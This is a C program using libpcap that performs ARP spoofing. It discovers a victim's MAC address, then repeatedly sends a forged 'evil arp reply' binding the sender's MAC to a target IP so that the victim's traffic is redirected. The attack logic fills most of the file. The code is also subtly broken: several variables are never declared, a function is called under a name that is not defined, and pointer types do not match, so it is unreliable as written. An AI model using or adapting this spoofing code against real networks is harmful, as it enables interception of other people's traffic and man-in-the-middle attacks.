#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET	14
#define INET_ADDRSTRLEN	16
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <string.h> 
#include <stdio.h>
#include <errno.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

struct sniff_ethernet {

	uint8_t h_dest[ETHER_ADDR_LEN]; /* Destination host address */
	uint8_t h_source[ETHER_ADDR_LEN]; /* Source host address */
	uint16_t h_proto; /* IP? ARP? RARP? etc */
};

struct sniff_arp {
   uint16_t arp_htype; /*hardware type*/
   uint16_t arp_p; /*protocol*/
   uint8_t arp_hsize; /*hardware size*/
   uint8_t arp_psize; /*protocol size*/
   uint16_t arp_opcode; /*opcode*/
   uint8_t arp_smhost[16]; /*sender mac address*/
   struct in_addr arp_sip; /*sender ip address*/
   uint8_t arp_dmhost[16]; /*target mac address*/
   struct in_addr arp_dip; /*target ip address*/
};

struct sniff_ip {
	uint8_t ip_vhl;		/* version << 4 | header length >> 2 */
	uint8_t ip_tos;		/* type of service */
	uint16_t ip_len;		/* total length */
	uint16_t ip_id;		/* identification */
	uint16_t ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
	uint8_t ip_ttl;		/* time to live */
	uint8_t ip_p;		/* protocol */
	uint16_t ip_sum;		/* checksum */
	struct in_addr ip_src,ip_dst; /* source and dest address */
};
#define IP_HL(ip)	(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)	(((ip)->ip_vhl) >> 4)

struct sockaddr_in source,dest;
int get_mac_by_inf(u_char mac[6], const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) != 0){
		printf("can't get MAC Address\n");
		close(fd);
		return 0;	
	}	

	for (int i = 0; i < 6; ++i){
		mac[i] = ifr.ifr_addr.sa_data[i];
		//printf("%02d", mac[i]);
	}
	printf("\n");

	close(fd);
	return 1;
}
int get_ip_by_inf(struct in_addr* ip, const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in *sin;

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);

	if(ioctl(fd, SIOCGIFADDR, &ifr) != 0){
		printf("can't get IP Address\n");
		close(fd);
		return 0;
	}
	 
	close(fd);
	
	sin = (struct sockaddr_in*) &ifr.ifr_addr;
	*ip = sin->sin_addr;

	return 1;
}
void arp_packet(u_char *packet[], int *length, int opcode, struct in_addr my_ip, struct in_addr victim_ip, u_char *my_mac, u_char *victim_mac){
	struct ether_header eth;
	struct ether_arp arp;
	
	//fill the ethernet header
	if(opcode == ARPOP_REQUEST){
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = 0xff;
	}
	else{
		
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = victim_mac[i];	
	}


	for(int i=0; i<6; i++){
		eth.ether_shost[i] = my_mac[i];
	}

	eth.ether_type = htons(ETHERTYPE_ARP);
	
	memcpy(*packet, &eth, sizeof(eth));
	(*length) += sizeof(eth);

	//fill the arp request header
	arp.arp_hrd = htons(0x0001);
	arp.arp_pro = htons(0x0800);
	arp.arp_hln = 0x06;
	arp.arp_pln = 0x04;
	arp.arp_op = htons(opcode);
	
	for(int i=0; i<6; i++){
		arp.arp_sha[i] = my_mac[i];
	}
	
	if(opcode == ARPOP_REPLY){
		for(int i=0; i<6; i++)
			arp.arp_tha[i] = victim_mac[i];
	}
	else{
			for(int i=0; i<6; i++)
				arp.arp_tha[i] = 0x00;
	}

	memcpy(arp.arp_spa, &my_ip, sizeof(my_ip));
	memcpy(arp.arp_tpa, &victim_ip, sizeof(victim_ip));
	
	memcpy((*packet)+(*length), &arp, sizeof(arp));
	(*length) += sizeof(arp);

}

int main(int argc, char *argv[])
{
		pcap_t *handle;			/* Session handle */
		char *dev;			/* The device to sniff on */
		char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
		struct bpf_program fp;		/* The compiled filter */
		bpf_u_int32 mask;		/* Our netmask */
		bpf_u_int32 net;		/* Our IP */
		char filter_exp[] = "port 80";
		struct pcap_pkthdr *header;	/* The header that pcap gives us */
		const u_char *Buffer;		/* The actual packet */
		int size;
		int packetnumber = 10;
		u_char *buffer;
		int res;
		int i;
/* Define the device */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(2);
		}
		/* Find the properties for the device */
		if (pcap_lookupnet(argv[1], &net, &mask, errbuf) == -1) {
			fprintf(stderr, "Couldn't get netmask for device %s: %s\n", argv[1], errbuf);
			net = 0;
			mask = 0;
		}
		/* Open the session in promiscuous mode */
		handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
		//handle = pcap_open_live("dum0", BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
			return(2);
		}
		/* Compile and apply the filter */
		if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
			fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
		}
		if (pcap_setfilter(handle, &fp) == -1) {
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
		}
	
	struct sniff_ethernet* ethernet;
	struct sniff_arp* arp;
	struct in_addr my_ip_addr;

	u_char my_mac[6];
	u_char victim_mac[6];
	u_char packet[100];
	u_char receive_packet[1500];

	get_mac_by_inf(my_mac, argv[1]);
	get_ip_by_inf(&my_ip_addr, argv[1]);
	inet_pton(AF_INET, argv[2], &vic_ip_addr);
	inet_pton(AF_INET, argv[3], &target_ip_addr);
	
	inet_ntop(AF_INET, &my_ip_addr, ip_addr, sizeof(ip_addr));
	
	printf("send arp %s\n", argv[2]);

	arp_packet(&packet, &length, ARPOP_REQUEST, my_ip_addr, victim_ip_addr, my_mac, NULL);
	while(1){
		flag = pcap_next_ex(handle, &header, &recv_packet);
		if(flag == 1)
			break;

		else if(flag == -1){
			fprintf(stderr, "network errer!! : %s\n", pcap_geterr(handle));
			return -7;
		}
		else
			fprintf(stderr, "timeout expired\n");
	};

	for(int i=6; i<12; i++){
		vic_mac[i-6] = recv_packet[i];
		printf("%02x", vic_mac[i-6]);
		if(i != 11)
			printf(":");
	}

	memset(packet, 0, length);
	
	length = 0;
	
	//build evil arp reply packet	
	make_arp_packet(&packet, &length, ARPOP_REPLY, target_ip_addr, vic_ip_addr, my_mac, vic_mac);

	//send evil arp reply packet

	printf("\nsend evil arp reply to victim[%s] sfooping my ip[%s] to target ip[%s]\n", argv[2], ip_addr, argv[3]);

	while(1){
		if(pcap_sendpacket(handle, packet, length) != 0)
			fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
	
		sleep(500);
	}	
		
    
    /* Fill the rest of the packet */
   
	/*for(i=42;i<100;i++)
	{
        packet[i]=0;
    }*/
	//for(i=0;i<5;i++)
	//{


	    /* Send down the packet */
	    //pcap_sendpacket(handle,packet,60);

	//pcap_sendqueue_transmit(outp, squeue, sync);
	//}
	return 0;
}